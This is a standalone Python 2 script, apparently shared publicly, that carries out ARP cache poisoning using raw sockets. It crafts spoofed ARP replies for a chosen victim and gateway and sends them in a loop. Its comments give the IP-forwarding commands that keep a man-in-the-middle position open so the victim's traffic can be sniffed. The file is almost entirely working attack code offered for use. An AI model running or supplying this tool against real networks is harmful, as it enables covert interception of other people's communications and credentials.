#! /usr/bin/python2

# ARP poison example using raw packets
#   instead of scapy. Note that this is 
#   very noisey. Any half brained admin 
#   would notice the arp activity.
# victim == the computer we want to sniff
# target == default gateway (in most cases)
# Written by: techb
# Date: May 28 2015
# Python: Version 2.7
# OS dev on: Arch Linux
# License: None, script is public domain,  but at 
#   least credit me if you share this.
# This script is presented 'as is' and the author
#   is not responsible for misuse or errors you may get.

# ip forrwarding until reboot
#  sysctl net.ipv4.ip_forward=1
#  echo 1 > /proc/sys/net/ipv4/ip_forward

import binascii
import socket
import time
import argparse

def getInterfaces():
	'''This function is not used here, but if you
	   don't know what interface you want to use
	   or the name of it. Since I'm on Arch they
	   decided it would be a good idea to make simple
	   interface names all odd'''
	# NEVER import inside a function or method
	# I put it here incase you used the function
	#   to show you need these libs for it.
	import os, re
	raw = os.popen("ip link show").read()
	interface = re.findall(r"\d: \w+:", raw)
	ilist = []
	for i in interface:
		ilist.append(i[:-1])
	return ilist
	
def getOwnMac(interface):
	'''Uhhhh, gets my own mac address.'''
	fd = open("/sys/class/net/%s/address" % interface , "r")
	mac = fd.read()
	fd.close()
	return mac.strip()

def buildPoison(victim, target, mymac):
    '''builds the custom packet used to poison
       the arp cache. Arguments should be tuples
       comtaining the ip and mac. (ip, mac)'''
    vip = victim[0]
    vmac = victim[1].lower()
    tip = target[0]
    tmac = target[1].lower()
 
    # create binary values to be sent on wire
    # the mac addr conversons are very ugly but work =)
    vip = socket.inet_aton(vip)
    vmac = binascii.unhexlify(''.join(vmac.split(':')))
    tip = socket.inet_aton(tip)
    tmac = binascii.unhexlify(''.join(tmac.split(':')))
    mymac = binascii.unhexlify(''.join(mymac.split(':')))

    # build ethernet headers
    pcode = '\x08\x06' #ARP code for eth header
    veth = vmac+mymac+pcode
    teth = tmac+mymac+pcode

    # build arp headers
    htype = '\x00\x01' # we're on ethernet
    proto = '\x08\x00' # intended protocol, which is ipv4
    hsize = '\x06' # mac addr size
    psize = '\x04' # ip addr size
    opcode = '\x00\x02' # arp option code, 2 is reply
    arp = htype+proto+hsize+psize+opcode

    # build spoofed portion of arp header
    vspoof = mymac+tip+vmac+vip # victim
    tspoof = mymac+vip+tmac+tip # target

    # build final packets
    vpacket = veth+arp+vspoof
    tpacket = teth+arp+tspoof

    return (vpacket, tpacket)

def main(v_mac, t_mac, delay=2):
    '''Main loop. Can pass a delay argument, defaults to 2 seconds.'''
    interface = 'enp2s0' #yours will probably be diff
    my_mac = getOwnMac(interface)
    packets = buildPoison(v_mac, t_mac, my_mac)
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    s.bind((interface, socket.htons(0x0800)))
    print "Poisoning..."
    while True:
        s.send(packets[0])
        s.send(packets[1])
        time.sleep(delay)

if __name__ == '__main__':
    ap = argparse.ArgumentParser(description="ARP poison using raw sockets")
    ap.add_argument("-vm", "--victimmac", help="Victim MAC address", required=True)
    ap.add_argument("-vi", "--victimip", help="Victim IP address", required=True)
    ap.add_argument("-tm", "--targetmac", help="Target MAC address [gateway]", required=True)
    ap.add_argument("-ti", "--targetip", help="Target IP address [gateway]", required=True)
    ap.add_argument("-d", "--delay", help="Delay in seconds between sending packets [optional]", type=float)
    args = ap.parse_args()
    
    if args.delay:
        main((args.victimip, args.victimmac), (args.targetip, args.targetmac), delay=args.delay)
    else:
        main((args.victimip, args.victimmac), (args.targetip, args.targetmac))


